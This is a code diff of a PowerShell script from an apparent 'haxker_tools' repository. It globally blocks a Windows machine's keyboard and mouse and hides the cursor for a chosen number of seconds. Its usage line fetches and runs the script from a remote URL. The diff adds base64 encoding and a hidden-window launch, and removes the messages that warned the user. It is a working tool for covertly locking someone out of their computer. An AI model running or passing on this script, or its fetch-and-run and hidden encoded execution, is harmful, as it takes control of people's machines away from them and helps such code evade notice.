@@ -1,130 +1,135 @@
 # 請使用以下方法進行參數傳送:
-# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/block_all_input/block.txt").Content)) -time 
+# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/block_all_input/block.txt").Content)) -time 10
 
 param(
     [int]$time = 10
 )
 
-# ==========================================
-# 可配置參數（放在最上方，方便修改）
-# ==========================================
-$DurationSeconds = $time       # 禁用輸入的總時長（秒）
-$HideCursor = $true            # 是否隱藏滑鼠游標（視覺增強）
-$BlockKeyboard = $true         # 是否攔截鍵盤（保留以便擴充）
-$BlockMouse = $true            # 是否攔截滑鼠（保留以便擴充）
+# 將原始攔截邏輯包裝為 ScriptBlock
+$AsyncBlock = {
+    param([int]$DurationSeconds)
 
-# ==========================================
-# 依賴組件
-# ==========================================
-Add-Type -AssemblyName System.Windows.Forms
+    # ==========================================
+    # 可配置參數（放在最上方，方便修改）
+    # ==========================================
+    $HideCursor = $true            # 是否隱藏滑鼠游標（視覺增強）
+    $BlockKeyboard = $true         # 是否攔截鍵盤（保留以便擴充）
+    $BlockMouse = $true            # 是否攔截滑鼠（保留以便擴充）
 
-# ==========================================
-# 低階鍵盤/滑鼠鉤子定義（C# 程式碼）
-# ==========================================
-$HookCode = @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
+    # ==========================================
+    # 依賴組件
+    # ==========================================
+    Add-Type -AssemblyName System.Windows.Forms
 
-public class InputBlocker {
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WH_MOUSE_LL = 14;
-    private const int WM_KEYDOWN = 0x0100;
-    private const int WM_SYSKEYDOWN = 0x0104;
+    # ==========================================
+    # 低階鍵盤/滑鼠鉤子定義（C# 程式碼）
+    # ==========================================
+    $HookCode = @"
+    using System;
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+    using System.Windows.Forms;
 
-    private static LowLevelKeyboardProc _keyboardProc = KeyboardCallback;
-    private static LowLevelMouseProc _mouseProc = MouseCallback;
-    private static IntPtr _keyboardHookID = IntPtr.Zero;
-    private static IntPtr _mouseHookID = IntPtr.Zero;
+    public class InputBlocker {
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WH_MOUSE_LL = 14;
+        private const int WM_KEYDOWN = 0x0100;
+        private const int WM_SYSKEYDOWN = 0x0104;
 
-    public static void SetHook() {
-        using (Process curProcess = Process.GetCurrentProcess())
-        using (ProcessModule curModule = curProcess.MainModule) {
-            IntPtr moduleHandle = GetModuleHandle(curModule.ModuleName);
-            _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, moduleHandle, 0);
-            _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, moduleHandle, 0);
+        private static LowLevelKeyboardProc _keyboardProc = KeyboardCallback;
+        private static LowLevelMouseProc _mouseProc = MouseCallback;
+        private static IntPtr _keyboardHookID = IntPtr.Zero;
+        private static IntPtr _mouseHookID = IntPtr.Zero;
+
+        public static void SetHook() {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule) {
+                IntPtr moduleHandle = GetModuleHandle(curModule.ModuleName);
+                _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, moduleHandle, 0);
+                _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, moduleHandle, 0);
+            }
         }
+
+        public static void Unhook() {
+            if (_keyboardHookID != IntPtr.Zero) {
+                UnhookWindowsHookEx(_keyboardHookID);
+                _keyboardHookID = IntPtr.Zero;
+            }
+            if (_mouseHookID != IntPtr.Zero) {
+                UnhookWindowsHookEx(_mouseHookID);
+                _mouseHookID = IntPtr.Zero;
+            }
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr KeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
+                return (IntPtr)1; // 攔截所有按鍵
+            }
+            return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam);
+        }
+
+        private static IntPtr MouseCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+            if (nCode >= 0) {
+                return (IntPtr)1; // 攔截所有滑鼠訊息
+            }
+            return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
+            IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn,
+            IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
     }
-
-    public static void Unhook() {
-        if (_keyboardHookID != IntPtr.Zero) {
-            UnhookWindowsHookEx(_keyboardHookID);
-            _keyboardHookID = IntPtr.Zero;
-        }
-        if (_mouseHookID != IntPtr.Zero) {
-            UnhookWindowsHookEx(_mouseHookID);
-            _mouseHookID = IntPtr.Zero;
-        }
-    }
-
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-    private static IntPtr KeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
-            return (IntPtr)1; // 攔截所有按鍵
-        }
-        return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam);
-    }
-
-    private static IntPtr MouseCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0) {
-            return (IntPtr)1; // 攔截所有滑鼠訊息
-        }
-        return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
-    }
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
-        IntPtr hMod, uint dwThreadId);
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn,
-        IntPtr hMod, uint dwThreadId);
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-}
 "@
 
-# ==========================================
-# 編譯 C# 程式碼
-# ==========================================
-if (-not ([System.Management.Automation.PSTypeName]'InputBlocker').Type) {
-    Add-Type -TypeDefinition $HookCode -ReferencedAssemblies System.Windows.Forms
+    # ==========================================
+    # 編譯 C# 程式碼
+    # ==========================================
+    if (-not ([System.Management.Automation.PSTypeName]'InputBlocker').Type) {
+        Add-Type -TypeDefinition $HookCode -ReferencedAssemblies System.Windows.Forms
+    }
+
+    # ==========================================
+    # 啟動攔截
+    # ==========================================
+    [InputBlocker]::SetHook()
+
+    if ($HideCursor) {
+        [System.Windows.Forms.Cursor]::Hide()
+    }
+
+    # ==========================================
+    # 持續 $DurationSeconds 秒
+    # ==========================================
+    $endTime = (Get-Date).AddSeconds($DurationSeconds)
+    while ((Get-Date) -lt $endTime) {
+        [System.Windows.Forms.Application]::DoEvents()
+        Start-Sleep -Milliseconds 50
+    }
+
+    # ==========================================
+    # 恢復系統
+    # ==========================================
+    if ($HideCursor) {
+        [System.Windows.Forms.Cursor]::Show()
+    }
+    [InputBlocker]::Unhook()
 }
 
-# ==========================================
-# 啟動攔截
-# ==========================================
-[InputBlocker]::SetHook()
+# 將程式碼轉為 Base64 並以背景隱藏進程 (WindowStyle Hidden) 執行
+$bytes = [System.Text.Encoding]::Unicode.GetBytes("& { $AsyncBlock } -DurationSeconds $time")
+$encodedCommand = [Convert]::ToBase64String($bytes)
 
-if ($HideCursor) {
-    [System.Windows.Forms.Cursor]::Hide()
-}
-
-Write-Host "鍵盤和滑鼠輸入已被全域攔截（移動/點擊/滾輪均無效）" -ForegroundColor Yellow
-Write-Host "持續時間：$DurationSeconds 秒（按任何鍵均無效，包括 ESC）" -ForegroundColor Yellow
-
-# ==========================================
-# 持續 $DurationSeconds 秒
-# ==========================================
-$endTime = (Get-Date).AddSeconds($DurationSeconds)
-while ((Get-Date) -lt $endTime) {
-    [System.Windows.Forms.Application]::DoEvents()
-    Start-Sleep -Milliseconds 50
-}
-
-# ==========================================
-# 恢復系統
-# ==========================================
-if ($HideCursor) {
-    [System.Windows.Forms.Cursor]::Show()
-}
-[InputBlocker]::Unhook()
-
-Write-Host "`n已恢復鍵盤和滑鼠正常狀態。" -ForegroundColor Green
+Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", $encodedCommand
